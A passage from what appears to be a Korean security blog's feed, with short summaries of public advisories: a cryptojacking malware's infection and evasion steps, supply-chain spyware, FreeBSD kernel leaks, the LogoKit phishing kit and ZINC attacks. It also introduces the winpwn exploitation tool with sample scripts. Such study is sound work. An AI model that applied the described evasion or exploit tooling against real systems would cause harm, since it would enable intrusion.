이는 <code>check_login()</code>의 반환 주소를 덮어 원격 코드 실행으로 이어질 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>bof</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>L0ch</tag>
      
      <tag>nas</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Pro-Ocean: Rocke Group&#39;s New Cryptojacking Malware</title>
    <link href="/2021/02/04/idioth/2021-02-04/"/>
    <url>/2021/02/04/idioth/2021-02-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://unit42.paloaltonetworks.com/pro-ocean-rocke-groups-new-cryptojacking-malware/">Pro-Ocean: Rocke Group’s New Cryptojacking Malware</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache, Orcale, Redis, Tecent Cloud, Alibaba Cloud 등 클라우드 서비스</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2019년 Rocke Group의 클라우드 서비스를 타깃으로 한 Monero 채굴기에 대한 문서가 공개된 후 멀웨어가 업데이트되었습니다. 향상된 루트킷과 웜을 사용하여 보안 회사들의 탐지 기술을 우회하고 클라우드 애플리케이션을 타깃으로 한 다음과 같은 알려진 취약점을 사용했습니다.</p><ul><li>Apache ActiveMQ(CVE-2016-3088)</li><li>Oracle WebLogic(CVE-2017-10271)</li><li>Redis(unsecure instances)</li></ul><p>Pro-Ocean은 XMRig Miner를 포함하며 탐지를 피하기 위해 다음과 같은 난독화 레이어를 사용합니다.</p><ul><li>UPX로 패킹되어 있고 탐지를 피하기 위해 UPX magic string을 삭제</li><li>언팩 된 바이너리 안에 모듈이 gzip으로 압축되어 있고, XMRig 바이너리가 압축된 모듈 안에 존재</li><li>XMRig 바이너리 또한 UPX로 패킹되어 있고 magic string이 존재하지 않음</li></ul><p>Pro-Ocean의 4가지 모듈은 다음과 같은 함수를 통해 순서대로 추출되고 실행됩니다.</p><ol><li><code>main_ReleaseExerkt</code>을 통해 Rootkit Module이 실행, 루트킷과 악성 서비스 설치</li><li><code>main_ReleaseExe</code>를 통해 XMRig Miner 실행</li><li><code>main_ReleaseExelk</code>를 통해 Watchdog 실행</li><li><code>main_ReleaseExescan</code>을 통해 infection script 실행</li></ol><p><code>LD_PRELOAD</code>를 사용하여 악성 행위를 숨기고 <code>Libprocesshider</code>를 사용하여 프로세스를 숨기며 python infection script를 사용하여 public IP와 동일한 16비트 서브넷에 있는 모든 컴퓨터에 감염을 시도합니다. python script는 악성 http 서버에서 installation script를 다운로드하는 페이로드를 보내 Pro-Ocean을 설치하여 확산됩니다. Installation script는 bash로 작성되어 있으며 다음과 같은 순서로 동작합니다.</p><ol><li>Luoxk, BillGates, XMRig, Hashfish 등의 다른 멀웨어나 Miner 삭제 시도.</li><li>다른 멀웨어가 복구될 수 없도록 모든 cron task 삭제</li><li>인터넷에 모든 접근 권한을 갖기 위해 iptables 방화벽 비활성화</li><li>Tencent Cloud나 Alibaba Cloud에서 멀웨어가 실행될 경우, 탐지 우회를 위해 모니터링 agents 삭제</li><li>SSH key를 확인하고 다른 기기를 감염시키는 데 사용</li></ol><p>또한 Monero 채굴을 효과적으로 하기 위해 Watchdog Module을 통해 CPU 사용량이 30%가 넘는 프로세스를 강제 종료하고, 멀웨어가 작동 중인지 확인하고 작동 안 할 시 실행을 수행합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>cloud</tag>
      
      <tag>cryptocurrency</tag>
      
      <tag>malware</tag>
      
      <tag>monero</tag>
      
      <tag>rocke</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] NoxPlayer Spyware</title>
    <link href="/2021/02/03/fabu1ous/2021-02-03/"/>
    <url>/2021/02/03/fabu1ous/2021-02-03/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://thehackernews.com/2021/02/a-new-software-supplychain-attack.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+TheHackersNews+(The+Hackers+News+-+Cyber+Security+Blog)">A new Software Supply-Chain Attack Targeted Millions With Spyware</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>NoxPlayer</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ESET에서 안드로이드 에뮬레이터 NoxPlayer의 사용자를 타겟으로 한 악성 코드가 배포되고 있다고 발표했습니다. 해커는 NoxPlayer의 개발사 BigNox의 파일 호스팅 서버를 해킹해 업데이트 다운로드 URL을 조작하는 것으로 세 종류의 악성 코드를 배포했습니다. 해당 악성 코드는 금전적 이익 보단 특정 사용자를 대상으로 한 감시 목적 기능에 초점이 맞춰져 있다고 합니다. </p><p>NoxPlayer 사용자에게 악성 코드가 배포되는 과정은 다음과 같습니다.</p><ol><li>NoxPlayer 시작과 동시에 서버로 업데이트 요청</li><li>서버에서 BigNox CDN network를 통한 업데이트 다운로드 URL을 제공</li><li>해당 업데이트 진행</li><li>업데이트가 악성 코드를 디바이스에 제공</li></ol><p>배포된 악성 코드는 다음과 같습니다.</p><ul><li>Gh0st RAT ( Remote Administration Tool )</li><li>PoisonIvy RAT</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://en.wikipedia.org/wiki/Gh0st_RAT">https://en.wikipedia.org/wiki/Gh0st_RAT</a></p><p><a href="https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf">https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-poison-ivy.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>spyware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Uninitialized kernel stack leaks in freeBSD</title>
    <link href="/2021/02/02/l0ch/2021-02-02/"/>
    <url>/2021/02/02/l0ch/2021-02-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/elttam/advisories/tree/master/CVE-2020-25578%20CVE-2020-25579">CVE-2020-25578/CVE-2020-25579 freeBSD fsdisclosure</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>freeBSD</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>BSD계열의 오픈소스 운영체제인 freeBSD의 여러 파일 시스템에서 커널 스택 주소를 유출할 수 있는 취약점이 공개되었습니다.</p><p>다음은 영향을 받는 파일 시스템입니다.</p><ul><li>tmpfs</li><li>smbfs</li><li>autofs</li><li>mqueuefs</li><li>msdosfs</li></ul><p>커널 스택 주소가 유출되는 <code>dirent</code> 구조체는 다음과 같은 필드로 구성되어 있습니다.</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dirent</span> &#123;</span>                                                                     <span class="hljs-keyword">ino_t</span>      d_fileno;        <span class="hljs-comment">/* file number of entry */</span>                          <span class="hljs-keyword">off_t</span>      d_off;       <span class="hljs-comment">/* directory offset of entry */</span>                         <span class="hljs-keyword">__uint16_t</span> d_reclen;        <span class="hljs-comment">/* length of this record */</span>                         <span class="hljs-keyword">__uint8_t</span>  d_type;      <span class="hljs-comment">/* file type, see below */</span>                              <span class="hljs-keyword">__uint8_t</span>  d_pad0;                                                              <span class="hljs-keyword">__uint16_t</span> d_namlen;        <span class="hljs-comment">/* length of string in d_name */</span>                    <span class="hljs-keyword">__uint16_t</span> d_pad1;                                                          <span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __BSD_VISIBLE                                                               </span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXNAMLEN   255                                                         </span>    <span class="hljs-keyword">char</span>    d_name[MAXNAMLEN + <span class="hljs-number">1</span>];  <span class="hljs-comment">/* name must be no longer than this */</span>      <span class="hljs-meta">#<span class="hljs-meta-keyword">else</span>                                                                           </span>    <span class="hljs-keyword">char</span>    d_name[<span class="hljs-number">255</span> + <span class="hljs-number">1</span>];    <span class="hljs-comment">/* name must be no longer than this */</span>          <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span>                                                                          </span>&#125;;</code></pre><p>이중 msdosfs의 취약점은 <code>msdosfs_readdir</code> 함수에서 발생합니다. 해당 함수에서는 MSDOS 파일 시스템의 루트에서 <code>readdir</code> 이 호출된 경우 <code>dirent_terminate</code>에서 <code>d_pad0</code>, <code>d_pad1</code>,<code>d_name</code> 필드를 초기화한 이후 <code>uiomove</code> 함수에서 <code>struct dirent dirbuf</code> 객체의 데이터를 유저 랜드로 복사합니다. 그러나 루트 이외의 MSDOS 파일 시스템에서 <code>readdir</code>을 호출한 경우 <code>d_pad0</code>, <code>d_pad1</code> 필드가 초기화되지 않은 상태로 <code>uiomove</code> 함수를 통해 데이터가 유저 랜드로 복사되어 커널의 스택 주소를 유출할 수 있습니다.</p><p>msdosfs를 제외한 파일 시스템은 다음 함수 목록에서 커널 스택에 <code>struct dirent</code> 객체를 할당합니다.</p><ul><li><code>tmpfs_dir_getdotdent</code></li><li><code>tmpfs_dir_getdotdotdent</code></li><li><code>smbfs_readvdir</code></li><li><code>autofs_readdir_one</code></li><li><code>mqfs_readdir</code></li></ul><p>그러나 객체의 데이터를 유저 랜드로 복사하기 전에<code>d_off</code> 필드를 초기화하지 않아 커널의 스택 주소가 남아있으며 이를 유출할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>uninitialized stack</tag>
      
      <tag>L0ch</tag>
      
      <tag>freeBSD</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 피싱 폼 데이터를 동적으로 생성하는 LogoKit</title>
    <link href="/2021/02/01/idioth/2021-02-01/"/>
    <url>/2021/02/01/idioth/2021-02-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://community.riskiq.com/article/a068810a">LogoKit: Simple, Effective, and Deceptive</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>악성 URL에 접근하는 사람</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>RiskIQ에서 DOM(Document Object Model)과 상호 작용하여 HTML form data를 동적으로 생성하는 피싱 키트인 LogoKit을 발견했습니다.</p><p>LogoKit은 복잡한 레이아웃과 다양한 파일을 활용하는 다른 피싱 키트와 달리 embeddable한 자바스크립트 함수를 모아뒀으며 DOM과의 상호 작용을 통해 사용자 상호 작용 없이 페이지 내의 콘텐츠와 HTML form data를 동적으로 변경할 수 있습니다.</p><p>LogoKit은 피해자의 이메일이 포함된 URL(<code>phishingpage[.]site/login.html#victim@company.com</code>)을 이메일로 전송합니다. URL에 포함된 이메일은 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Location/hash">location hash</a>로 사용자/회사 도메인으로 나뉘어 저장되며 회사 도메인 로고를 가져옵니다. 또한 <code>username</code> 필드에 이메일을 자동으로 채워 피해자가 비밀번호를 입력하도록 유도합니다. 피해자가 비밀번호를 입력하면 이메일이 유효한 지 확인하기 위해서 첫 번째 입력은 암호가 틀렸으니 다시 입력하라는 메시지를 표시하고 두 번째 입력에서 이메일과 암호를 외부로 전송한 후 회사 사이트로 리다이렉션 합니다.</p><p>Logokit는 규모가 작고 회사 로그인 포털을 모방하는 식의 간단한 방법을 통해 구축이 가능하며, Firebase, Github, Oracle Cloud 등 신뢰할 수 있는 공개 서비스에 Javascript를 호스팅 할 수 있으므로 매우 위협적입니다. 또한 타깃 당 단일 URL을 갖고 회사 로고를 사용하므로 쉽게 위협에 노출될 수 있으므로 많은 주의가 필요합니다.</p><p>LogoKit 피싱 링크의 예시 : <code>hxxps://324634XXXa2616-dot-XXXX-301XX4.df.r.appspot.com/#recruitmentXXX@XXX.com</code></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>social engineering</tag>
      
      <tag>idioth</tag>
      
      <tag>logokit</tag>
      
      <tag>phishkit</tag>
      
      <tag>phishing</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 part1 - pwntools for windows</title>
    <link href="/2021/01/31/l0ch/pwncoolsexy-part1/"/>
    <url>/2021/01/31/l0ch/pwncoolsexy-part1/</url>
    
    <content type="html"><![CDATA[<p>안녕하세요 L0ch입니다! 오늘은 새로 연재할 시리즈물을 주섬주섬 챙겨 왔습니다. 제목부터 정상이 아닌 느낌이 슬슬 오시죠..?</p><p>때는 시리즈물 기획 회의 중 아무 생각 없이 “펀(pwn)쿨섹좌 컨셉 어떰?”이라고 말했는데 팀원들 반응이 격하더라구요.</p><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/1.png"></p><blockquote><p>내가 이 구역의 미친X이다!!</p></blockquote><p>회의하면서 딴짓하다가 뱉은 말이 본의 아니게 극찬(?)을 들어버려 탄생한 새로운 시리즈.. 과연 제대로 마무리할 수 있을지!</p><h1 id="pwnable은-cool하고-sexy하게"><a href="#pwnable은-cool하고-sexy하게" class="headerlink" title="pwnable은 cool하고 sexy하게"></a>pwnable은 cool하고 sexy하게</h1><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/2.png"></p><blockquote><p>포너블을 할 때는 즐거워야 합니다. 그리고 쿨하고 섹시해야 하죠</p></blockquote><p><em><del>오늘부터</del></em> 제 좌우명입니다. 밑도 끝도 없이 cool하고 sexy하게 포너블을 뿌수는 것을 목표로 하는 시리즈입니다.</p><p>그래도 계획은 세우고 뿌셔야겠습니다.</p><ul><li>툴 소개</li><li>Windows exploit technique</li><li>CTF Challenge</li></ul><p>정도로 진행될 예정이며 part 5까지 구상중이지만 뭐 사람 일은 어떻게 될지 모르는거니 일단 시작해보죠 ㅎ 시리즈 첫 글은 가볍게 출발하기 위해 간단한 Windows 툴 소개 정도로 하려고 합니다.</p><h1 id="pwntools-for-windows-winpwn"><a href="#pwntools-for-windows-winpwn" class="headerlink" title="pwntools for windows - winpwn"></a>pwntools for windows - winpwn</h1><p>포너블을 공부하셨던 분들이라면 pwntools은 모르시는 분이 없을 거라고 생각합니다. 리눅스 포너블을 할 때 꼭 필요한 툴이죠.<br>그런데..! pwntools은 윈도우 환경의 익스플로잇은 지원하지 않습니다. ㅠㅠ </p><p><a href="https://github.com/Byzero512/winpwn">winpwn</a>은 기존 pwntools에서 공식적으로 지원하지 않는 윈도우 환경의 바이너리 분석, 익스플로잇을 위한 툴입니다. pwintools이란 이름의 비슷한 기능을 지원하는 모듈도 있던데, 제 기준에서는 winpwn이 쓰기에 더 편하더라구요. 그래서 오늘은 winpwn에 대해 짧게 소개해보겠습니다.</p><h1 id="설치"><a href="#설치" class="headerlink" title="설치"></a>설치</h1><p><code>pip/pip3 install winpwn</code> 으로 설치할 수 있습니다. 다만 디버거 기능을 사용하기 위해서는 아래 과정이 추가로 필요합니다.</p><ol><li><code>C:\\Users\\[사용자]</code> 경로에 <a href="https://github.com/Byzero512/winpwn/blob/master/.winpwn">.winpwn</a> 파일을 생성해 설치되어 있는 디버거 경로를 설정합니다. 이후에 디버거를 사용할 때 코드에서 직접 설정할 수도 있습니다.</li><li>다음 파이썬 패키지를 설치합니다<ul><li>pip install pefile</li><li>pip install keystone</li><li>pip install capstone</li></ul></li></ol><p>keystone 설치 시 발생하는 에러는 Visual C++ Compiler for Python 2.7 또는 OpenSSL 설치로 해결할 수 있습니다. 이런 불친절한 설치 에러 메시지..</p><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/3.png"></p><blockquote><p>그래도 파이썬인게 어디에요 ㅋㅋ</p></blockquote><p>추가로 Windows Terminal을 사용해야 예쁘게 출력되는 걸 볼 수 있으니 Microsoft Store에서 설치해주세요. Windows Terminal을 설치하셨다면 이제부터 cmd랑 파워쉘 갖다 버리고 이거 쓰시면 됩니다. </p><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/6.png"></p><blockquote><p>Windows Terminal 쓰세요!! 두 번 쓰세요!!!</p></blockquote><h1 id="기능"><a href="#기능" class="headerlink" title="기능"></a>기능</h1><p>설치도 했으니 어떤 기능들이 있는지 쓰윽 둘러봐야겠죠? </p><p>우선 기존 pwntools에서 제공하는 기본적인 기능들은 대부분 지원하며 거기에 Windows에서 사용하는 PE 바이너리 분석을 위해 지원하는 몇 가지 기능이 추가되었죠. 지금부터 하나씩 살펴보도록 하겠습니다!</p><h2 id="Debugger-attach"><a href="#Debugger-attach" class="headerlink" title="Debugger attach"></a>Debugger attach</h2><p>기존 pwntools에서는 <code>gdb.attach()</code> 를 사용해 gdb에 attach 할 수 있었다면 pwintools에서는 <code>windbg.attach()</code> 을 사용해 바이너리를 windbg에 attach 할 수 있습니다. windbg preview, x64dbg, mingw gdb도 사용이 가능하며 브레이크 포인트 등의 script도 사용할 수 있습니다.</p><p>간단한 예제로 windbg preview에 attach 해보겠습니다.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *<span class="hljs-comment">#.winpwn 설정하지 않았을경우 작성</span><span class="hljs-comment">#context.debugger=&quot;windbgx&quot;</span><span class="hljs-comment">#context.windbgx=&quot;C:\\Users\\dw0rdptr\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WinDbg_8wekyb3d8bbwe\\WinDbgX.exe&quot;</span>p = process(<span class="hljs-string">&quot;./binary.exe&quot;</span>)windbgx.attach(p, script=<span class="hljs-string">&quot;bp 0xbe1106&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">40</span>)input()</code></pre><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/4.png"></p><p>위 사진과 같이 windbg preview도 잘 붙고, 브레이크 포인트도 아주 잘 걸린 것을 확인할 수 있습니다. 넘나 편한것…</p><h2 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h2><p>pwntools에서 <code>elf</code>로 바이너리를 열어 함수 주소을 구하듯이 winpwn에서는 <code>winfile</code> 로 pe 파일을 열어 <code>symbols</code> 함수로 바이너리와 dll의 함수 주소의 IAT/EAT offset을 가져올 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">&quot;debug&quot;</span>context.arch=<span class="hljs-string">&quot;i386&quot;</span>p = process(<span class="hljs-string">&quot;./binary.exe&quot;</span>)pe = winfile(<span class="hljs-string">&quot;./binary.exe&quot;</span>)ntdll = winfile(<span class="hljs-string">&quot;./ntdll.dll&quot;</span>)print(<span class="hljs-string">&quot;exit offset : &quot;</span>+hex(pe.symbols[<span class="hljs-string">&quot;exit&quot;</span>]))print(<span class="hljs-string">&quot;RtlInitializeSListHead :&quot;</span>+hex(ntdll.symbols[<span class="hljs-string">&quot;RtlInitializeSListHead&quot;</span>]))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">20</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)</code></pre><p><img src="/2021/01/31/l0ch/pwncoolsexy-part1/5.png"></p><p>바이너리와 <code>ntdll.dll</code>을 로드해 각 모듈의 함수 오프셋을 확인할 수 있습니다.</p><p>그 외에도 <code>context.log_level</code>을 <code>debug</code>로 설정해 pwntools에서 익숙하게 봤던 send, receive 정보가 출력되는 것도 볼 수 있네요!</p><h2 id="Disable-DYNAMICBASE"><a href="#Disable-DYNAMICBASE" class="headerlink" title="Disable DYNAMICBASE"></a>Disable DYNAMICBASE</h2><p>winpwn에서는 필요한 경우 바이너리가 로드되는 시작 주소를 랜덤하게 배치하는 DynamicBase 기능을 간편하게 끄고 킬 수 있습니다. 일일이 바이너리의 <code>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</code> 섹션을 수정할 필요가 없죠</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">NOPIE</span>(<span class="hljs-params">fpath=<span class="hljs-string">&quot;&quot;</span></span>):</span>    <span class="hljs-keyword">import</span> pefile    pe_fp=pefile.PE(fpath)    pe_fp.OPTIONAL_HEADER.DllCharacteristics &amp;= \        ~pefile.DLL_CHARACTERISTICS[<span class="hljs-string">&quot;IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE&quot;</span>]    pe_fp.OPTIONAL_HEADER.CheckSum = pe_fp.generate_checksum()    pe_fp.write(fpath)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">PIE</span>(<span class="hljs-params">fpath=<span class="hljs-string">&quot;&quot;</span></span>):</span>    <span class="hljs-keyword">import</span> pefile    pe_fp=pefile.PE(fpath)    pe_fp.OPTIONAL_HEADER.DllCharacteristics |= \        pefile.DLL_CHARACTERISTICS[<span class="hljs-string">&quot;IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE&quot;</span>]    pe_fp.OPTIONAL_HEADER.CheckSum = pe_fp.generate_checksum()    pe_fp.write(fpath)</code></pre><p><code>NOPIE(&quot;./binary.exe&quot;)</code> 혹은 <code>PIE(&quot;./binary.exe&quot;)</code> 로 사용하면 됩니다.</p><p>위에서 설명한 기능 외에도 프로세스 메모리를 읽고 쓸 수  있는 <code>readm</code>, <code>writem</code> 등 유용한 기능이 많습니다. 그 외의 기능들은 pwntools를 만져보셨던 분들이라면 똑같으니 금방 익숙해질 겁니다..!</p><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>윈도우 포너블을 시작할 때 진입장벽이 새로운 환경과 툴인데, 익숙한 툴을 사용해 접근하면 괜찮지 않을까 하고 소개한 툴이었습니다!<br>다음 글에서는 Windows의 Low Fragmentation Heap을 주제로 돌아오겠습니다.  </p><p>cool하고 sexy하게 포너블을 부수는 그날까지..!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>pwnable</tag>
      
      <tag>L0ch</tag>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] ZINC attacks against security researchers</title>
    <link href="/2021/01/30/fabu1ous/2021-01-30/"/>
    <url>/2021/01/30/fabu1ous/2021-01-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.microsoft.com/security/blog/2021/01/28/zinc-attacks-against-security-researchers/">ZINC attacks against security researchers</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Security researchers using Windows machine</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MSTIC(Microsoft Threat Intelligence Center)에서 ZINC라는 이름으로 추적 중인 Actor의 악성 행위를 탐지했다고 발표했습니다. </p><ul><li><p>Social Engineering</p><p>ZINC는 사회 공학적 해킹을 통해 보안 연구원들에게 접근해 그들에게 악성 파일을 배포했습니다.</p><ul><li><p>SNS</p><p>ZINC는 높은 퀄리티의 콘텐츠를 리트윗하는 여러 트위터 계정을 운영하면서 대략 2000명의 팔로워를 모으는 등 보안 커뮤니티에서 입지를 넓혔습니다. SNS를 통해 잠재적 타겟에서 접근 후 보안 관련 이슈나 exploit 기술에 대한 질문을 주고받아 신뢰를 쌓고, email이나 discord를 통해 pgp protected zip형식으로 악성 파일을 공유합니다.</p></li><li><p>Blog</p><p>ZINC는 br0vvnn이라는 이름의 블로그를 운영합니다. 그 블로그의 <code>DOS2RCE: A New Technique To Exploit V8 NULL Pointer Dereference Bug</code>라는 글이 트위터로 공유되었으며 이 블로그 링크를 chrome으로 열어본 시스템은 malware에 감염되었습니다.</p></li></ul></li><li><p>Malware</p><p>사회 공학적 해킹을 통해 타겟 시스템에 설치된 backdoor는 다음과 같습니다. </p><ul><li><p>Malicious VS project</p><p>Prebuilt-binary가 포함된 악성 Visual Studio 프로젝트입니다. 그중 하나는 Browse.vc.db를 가장한 악성 Comebacker DLL로, 타겟 시스템에서 dropper 역할을 합니다. 이 악성 프로젝트가 빌드될 때 Pre-build event로 등록된 PowerShell command가 <code>rundll32</code>를 통해 Combacker DLL을 실행합니다. </p></li><li><p>Klackring malware</p><p>악성 서비스를 타겟 시스템에 심는 DLL입니다. dropper를 통해 <code>C:\Windows\system32</code>에 <code>.sys</code>확장자로 설치됩니다. </p></li><li><p>MHTML</p></li><li><p>Viraglt64.sys</p><p>CVE-2017-16238 취약점이 존재하는 구버전 드라이버입니다. dropper에 의해 <code>C:\Windows\System32\drivers\circlassio.sys</code>라는 이름으로 타겟 시스템에 설치됩니다. ZINC는 CVE-2017-16238를 사용한 1-day 공격을 통해 타겟 시스템 kernel에 write 권한을 얻을 수 있습니다.</p></li></ul></li><li><p>C2 communication</p><p>backdoor는 command-and-control(C2) 채널에 60초마다 한번씩 check in 합니다. ZINC는 이 채널을 사용해 타겟 시스템에 원격 코드 실행, 타겟의 ip주소 확보, NetBIOS 확보 등의 행위를 할 수 있습니다.</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>social engineering</tag>
      
      <tag>backdoor</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows 커널 모드 그래픽 모듈의 권한 상승 취약점</title>
    <link href="/2021/01/29/l0ch/2021-01-29/"/>
    <url>/2021/01/29/l0ch/2021-01-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/1/27/zdi-can-12671-windows-kernel-dosprivilege-escalation-via-a-null-pointer-deref">ZDI-CAN-12671: WINDOWS KERNEL DOS/PRIVILEGE ESCALATION VIA A NULL POINTER DEREF</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>win32kfull.sys (Windows 32bit)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows kernel 모듈인 <code>win32kfull.sys</code>에서 NULL pointer dereference로 인한 권한 상승 취약점이 발견되었습니다.</p><p>win32k에서 모든 그리기 작업은 <code>SURFOBJ</code> 구조체를 통해 이루어집니다. <code>SURFOBJ</code> 의 <code>hdev</code> 필드는 특정 장치 드라이버에 대한 핸들이며 <code>flags</code> 필드 중 일부는 <code>HOOK_ *</code> 플래그로, <a href="https://docs.microsoft.com/en-us/windows/win32/api/winddi/nf-winddi-engassociatesurface">여기에서</a> 확인할 수 있습니다.</p><p>취약점은 <code>PlgBlt</code> 그리기 작업을 수행하는  <code>win32kfull.sys!BLTRECORD::bRotate</code>에서 발생합니다. <code>HOOK_PLGBLT</code>가 <code>SURFOBJ</code>의 <code>flags</code> 필드에 설정되어 있으면 기본 장치 드라이버의 <code>DrvPlgBlt</code>가 사용되는데, 이때 <code>hdev</code>에서 지정한 드라이버가 네이티브 <code>DrvPlgBlt</code>를 지원하는지 확인하지 않아 이를 지원하지 않는 경우 해당 테이블의 항목이 NULL이 되고 <code>win32kfull.sys!BLTRECORD::bRotate</code>에서 NULL 주소를 호출하게 됩니다.</p><p>취약점을 악용할 때 기본적으로 Windows 시스템에서는 유저 모드 프로세스에서 NULL 페이지를 매핑할 수 없지만 16비트 유저 모드 프로세스에서는 NULL 페이지 매핑이 가능해 16비트 가상 도스 머신인 NTVDM이 설치되어 있고, SMEP 적용이 되지 않은 Windows 32 bit에서만 제한적인 권한 상승이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>kernel</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft Azure Functions을 통한 Docker Container Escape</title>
    <link href="/2021/01/28/idioth/2021-01-28/"/>
    <url>/2021/01/28/idioth/2021-01-28/</url>
    
